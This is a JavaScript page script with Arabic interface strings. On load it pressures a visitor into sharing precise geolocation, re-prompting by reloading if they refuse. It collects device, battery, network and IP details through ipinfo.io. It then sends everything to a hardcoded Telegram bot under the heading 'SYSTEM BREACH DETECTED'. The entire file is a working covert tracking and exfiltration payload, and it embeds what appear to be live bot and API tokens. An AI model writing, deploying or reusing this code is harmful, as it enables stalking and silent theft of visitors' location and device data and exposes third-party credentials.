const token = "7593287636:AAFVDiMOuTsVlqmO-62MM3MGECREfXo9YEE";
const chatId = "2045242656";

function getDeviceInfo() {
  const ua = navigator.userAgent;
  const device = /Android/.test(ua) ? "Android" : /iPhone|iPad|iPod/.test(ua) ? "iOS" : "غير معروف";
  const deviceModel = ua.split(";")[2]?.trim() || "غير معروف";
  const browser = ua.match(/(Chrome|Firefox|Safari)\/[\d.]+/)?.[0] || "غير معروف";
  const cpu = navigator.platform || "غير معروف";
  return { ua, device, model: deviceModel, browser, cpu };
}

function getBatteryInfo() {
  return navigator.getBattery().then(battery => ({
    level: Math.round(battery.level * 100) + "%",
    charging: battery.charging ? "نعم" : "لا",
    powerSaving: navigator.getBattery().then(b => b.dischargingTime < 60 ? "مفعل" : "مغلق")
  }));
}

function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  return {
    type: connection?.type || "غير معروف",
    effectiveType: connection?.effectiveType || "غير معروف"
  };
}

function getLocation(callback) {
  navigator.geolocation.getCurrentPosition(async position => {
    const lat = position.coords.latitude.toFixed(4);
    const lon = position.coords.longitude.toFixed(4);
    const accuracy = position.coords.accuracy.toFixed(1);
    const googleMapsLink = `https://maps.google.com/?q=${lat},${lon}`;

    const ipData = await fetch("https://ipinfo.io/json?token=3b17f087ab9e68").then(res => res.json());

    const device = getDeviceInfo();
    const net = getNetworkInfo();
    const battery = await getBatteryInfo();
    const now = new Date().toLocaleString("ar-EG", { timeZoneName: 'short' });

    const msg = `
☣️ SYSTEM BREACH DETECTED
────────────────────────────

♠️ الموقع الجغرافي
// دقة الموقع: ±${accuracy} متر
// رابط خرائط جوجل: ${googleMapsLink}

♠️ بيانات الجهاز
// اسم الجهاز: ${device.model}
// نوع الجهاز: ${device.cpu}
// نظام التشغيل / المتصفح: ${device.device} / ${device.browser}
// معرف الجهاز (User-Agent): ${device.ua}

♠️ حالة البطارية
// نسبة البطارية: ${battery.level}
// هل يتم الشحن؟: ${battery.charging}
// وضع توفير الطاقة: ${await battery.powerSaving}

♠️ معلومات الشبكة
// نوع الاتصال: ${net.effectiveType}
// اسم الشبكة: ${ipData.org || "غير متاح"}
// مزود الخدمة (ISP): ${ipData.org || "غير متاح"}
// عنوان IP: ${ipData.ip || "غير معروف"}

♠️ التوقيت
// التوقيت الحالي: ${now}

────────────────────────────
:: تم إرسال البيانات بنجاح ::
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg,
        parse_mode: "Markdown"
      })
    });

  }, err => {
    alert("يجب السماح للموقع بالوصول إلى موقعك الجغرافي.");
    location.reload();
  }, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

getLocation();